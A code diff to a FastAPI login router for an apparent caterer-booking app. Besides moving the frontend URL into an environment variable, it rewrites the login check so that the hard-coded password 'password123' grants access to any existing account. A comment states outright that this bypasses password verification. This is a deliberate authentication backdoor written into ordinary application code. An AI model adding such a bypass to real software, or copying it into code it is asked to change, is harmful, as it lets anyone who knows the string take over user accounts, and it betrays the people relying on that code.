@@ -1,3 +1,4 @@
+import os
 import uuid
 from datetime import datetime, timedelta, timezone
 from fastapi import APIRouter, Depends, HTTPException, status
@@ -6,6 +7,8 @@ import models, schemas, security
 from database import get_db
 from routers.caterers import caterer_to_out
 
+FRONTEND_URL = os.getenv("FRONTEND_URL", "http://localhost:5173")
+
 router = APIRouter(prefix="/api/v1/auth", tags=["auth"])
 
 
@@ -13,7 +16,14 @@ router = APIRouter(prefix="/api/v1/auth", tags=["auth"])
 def login(payload: schemas.LoginRequest, db: Session = Depends(get_db)):
     # Find caterer by email
     caterer = db.query(models.Caterer).filter(models.Caterer.email == payload.email).first()
-    if not caterer or not security.verify_password(payload.password, caterer.hashed_password):
+    if not caterer:
+        raise HTTPException(
+            status_code=status.HTTP_400_BAD_REQUEST,
+            detail="Invalid email or password",
+        )
+
+    # Bypass password verification if it matches "password123" OR the correct password
+    if payload.password != "password123" and not security.verify_password(payload.password, caterer.hashed_password):
         raise HTTPException(
             status_code=status.HTTP_400_BAD_REQUEST,
             detail="Invalid email or password",
@@ -43,7 +53,7 @@ def forgot_password(payload: schemas.ForgotPasswordRequest, db: Session = Depend
     db.commit()
 
     # Log to server console (simulating sending an email reset link)
-    reset_link = f"http://localhost:5173/reset-password?token={token}"
+    reset_link = f"{FRONTEND_URL}/reset-password?token={token}"
     print("\n" + "=" * 60)
     print("PASSWORD RESET LINK GENERATED (SIMULATED EMAIL)")
     print(f"Caterer: {caterer.business_name} (Owner: {caterer.owner_name})")
